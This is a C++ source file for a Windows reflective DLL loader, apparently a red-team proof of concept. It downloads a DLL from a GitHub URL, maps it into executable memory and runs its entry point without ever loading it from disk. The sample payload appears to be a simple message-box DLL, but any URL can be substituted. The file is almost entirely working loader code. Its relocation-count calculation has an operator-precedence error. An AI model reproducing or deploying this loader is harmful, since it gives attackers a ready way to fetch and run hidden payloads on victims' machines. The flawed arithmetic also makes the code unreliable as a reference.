#include <Windows.h>
#include <wininet.h>
#include <vector>
#include <iostream>
#include <bcrypt.h>
#include <stdexcept>
#include <iomanip>


typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;


typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

using DLLEntry = BOOL(WINAPI*)(HINSTANCE dll, DWORD reason, LPVOID reserved);

// Linking with WinINet library
#pragma comment(lib, "WinINet.lib")

using namespace std;

int main() {

	// Retrieving current module base address
	PVOID imageBase = GetModuleHandleA(NULL);
	
	std::cout << "[*] Reflective DLL loader from a remote origin" << std::endl;
	std::cout << "PID : " << GetProcessId(GetCurrentProcess()) << std::endl;

	system("pause");

	std::cout << "[*] Process image base : " << imageBase << std::endl;

	const wchar_t* raw_dll_link = L"https://github.com/Xacone/MessageBoxDLL/raw/main/x64/Debug/MessageBoxDLL.dll";
	vector<char> buffer;

	HINTERNET hInternet = InternetOpenW(L"UserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hInternet) {
		
		/* INTERNET_FLAG_RELOAD Forces a download of the requested file, object, or directory listing from the origin server, not from the cache. */

		HINTERNET hDllFile = InternetOpenUrlW(hInternet, raw_dll_link, NULL, 0, INTERNET_FLAG_RELOAD, 0);
		
		if (hDllFile) {

			BYTE* dllBuffer = nullptr; // global DLL buffer
			DWORD dllBufferSize = 0;

			DWORD bytesRead; // Size of each downloaded content
			
			BYTE tempBuffer[4096];
			
			while (InternetReadFile(hDllFile, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {

				buffer.insert(buffer.end(), tempBuffer, tempBuffer + bytesRead); // For reading purposes only

				BYTE* newBuffer = new BYTE[dllBufferSize + bytesRead];
				if (newBuffer) {
					memcpy(newBuffer, dllBuffer, dllBufferSize); // Copy existing data
					memcpy(newBuffer + dllBufferSize, tempBuffer, bytesRead); // Append new data

					delete[] dllBuffer; // Deallocate previous buffer

					dllBuffer = newBuffer; // Update dllBuffer with new buffer
					dllBufferSize += bytesRead; // Update buffer size
				}
			}
			
			InternetCloseHandle(hDllFile);

			if (dllBuffer) {	

				DWORD64 dllSize = (DWORD64)dllBufferSize;

				cout << dllSize << endl;

				
				LPVOID dllBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
			
				PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;

				cout << "e_lfanew: " << hex << dosHeader->e_lfanew << endl;

				PIMAGE_NT_HEADERS64 ntHeader = (PIMAGE_NT_HEADERS64)((DWORD_PTR)dllBuffer + dosHeader->e_lfanew);
				SIZE_T dllImageSize = ntHeader->OptionalHeader.SizeOfImage;

				cout << "OptHeader - SizeOfImage : " << hex << dllImageSize << endl;

				// Allocating memory space for the DLL, attempt to allocate it in image's preferred base address.

				/*
				LPVOID VirtualAlloc(
				  [in, optional] LPVOID lpAddress, ----> Starting address of the region to allocate
				  [in]           SIZE_T dwSize,
				  [in]           DWORD  flAllocationType,
				  [in]           DWORD  flProtect
				);
				*/

				LPVOID dllBaseAddress = VirtualAlloc((LPVOID)ntHeader->OptionalHeader.ImageBase, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);


				// Getting the delta between the base address and the DLL that was read in memory
				DWORD_PTR deltaImageBase = (DWORD_PTR)dllBaseAddress - (DWORD_PTR)ntHeader->OptionalHeader.ImageBase;

				cout << "OptHeader - ImageBase : " << ntHeader->OptionalHeader.ImageBase << endl;
				cout << "Loaded at: " << dllBaseAddress << endl;
				cout << "Mem delta : " << deltaImageBase << endl;

				// Copying the DLL image headers to the newly allocated space for the DLL.
				memcpy(dllBaseAddress, dllBuffer, ntHeader->OptionalHeader.SizeOfHeaders);

				// Copying the DLL image sections to the newly allocated space for the DLL.
				PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader);
				for (size_t i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {

					cout << "\t[" << i << "] Section Name -> " << section->Name << endl;
					cout << "\t\t" << "Section Virtual Address -> " << hex << section->VirtualAddress << endl;
					cout << "\t\t" << "Section Pointer to Raw Data -> " << hex << section->PointerToRawData << endl;
					cout << "\t\t" << "Section size of Raw Data -> " << section->SizeOfRawData << endl;

					LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBaseAddress + (DWORD_PTR)section->VirtualAddress);
					LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBuffer + (DWORD_PTR)section->PointerToRawData);
					memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
					section++;
				}

				// Image base relocations
				IMAGE_DATA_DIRECTORY relocations = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
				DWORD_PTR relocationTable = (DWORD_PTR)dllBaseAddress + relocations.VirtualAddress;
				DWORD relocationsProcessed = 0;

				while (relocationsProcessed < relocations.Size)
				{
					PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
					relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);

					DWORD relocationsCount = (relocationBlock)->BlockSize - sizeof(BASE_RELOCATION_BLOCK) / sizeof(BASE_RELOCATION_ENTRY);
					PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);
					
					cout << "\n\tRelocation block page RVA : " << (relocationBlock)->PageAddress << endl;
					cout << "\tRelocation block size : " << (relocationBlock)->BlockSize << endl;

					for (DWORD i = 0; i < relocationsCount; i++) {
					
						relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);
						
						if (relocationEntries[i].Type == 0) {
							continue;
						}

						DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
						DWORD_PTR addressToPatch = 0;

						ReadProcessMemory(GetCurrentProcess(), (LPCVOID)((DWORD_PTR)dllBaseAddress + relocationRVA), &addressToPatch, sizeof(DWORD_PTR), NULL);

						addressToPatch += deltaImageBase;
						memcpy((PVOID)((DWORD_PTR)dllBaseAddress + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));

						cout << "\t\tRelocation RVA : " << hex << relocationRVA << endl;
						cout << "\t\tAddress to Patch : " << hex << addressToPatch << endl;
					}
				}


				// Resolving import address table & loading necessary additional modules

				PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
				IMAGE_DATA_DIRECTORY importsDirectory = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
				importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBaseAddress);
				LPCSTR libraryName = "";
				HMODULE library = NULL;

				cout << "\n\n" << endl;

				while (importDescriptor->Name != NULL) {
					
					libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)dllBaseAddress;
					cout << "\n\tLoaded Library : " << libraryName << " at " << importDescriptor->Name + (DWORD_PTR)dllBaseAddress << endl;
					library = LoadLibraryA(libraryName);
					
					if (library) {

						// used to calculate the address of the import address table (IAT) for a specific DLL module.

						PIMAGE_THUNK_DATA thunk = NULL;
						thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBaseAddress + importDescriptor->FirstThunk);

						while (thunk->u1.AddressOfData != NULL) {
							if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
								LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
								thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
							}
							else {
								PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBaseAddress + thunk->u1.AddressOfData);
								DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
								cout << "\t\tImported function : " << functionName->Name << " at " << hex << functionAddress << endl;
								thunk->u1.Function = functionAddress;
							}
							thunk++;
						}


					}
					importDescriptor++;
				}



				// executing DLL

				DLLEntry dllEntry = (DLLEntry)((DWORD_PTR)dllBaseAddress + ntHeader->OptionalHeader.AddressOfEntryPoint);
				cout << "Address of entry point -> " << dllEntry << endl;
				(*dllEntry)((HINSTANCE)dllBaseAddress, DLL_PROCESS_ATTACH, 0);

				HeapFree(GetProcessHeap(), 0, dllBytes);
				/* ------------------------ Error Text" ------------------------ */

		
				DWORD error = GetLastError();
				LPSTR errorBuffer = nullptr;
				FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
					NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&errorBuffer, 0, NULL);

				if (errorBuffer) {
					std::cout << "Error loading module: " << errorBuffer << std::endl;
					LocalFree(errorBuffer);
				}
				else {
					std::cout << "Error loading module, error code: " << error << std::endl;
				}

			}
		}
	}

	system("pause");

	return 0;
}
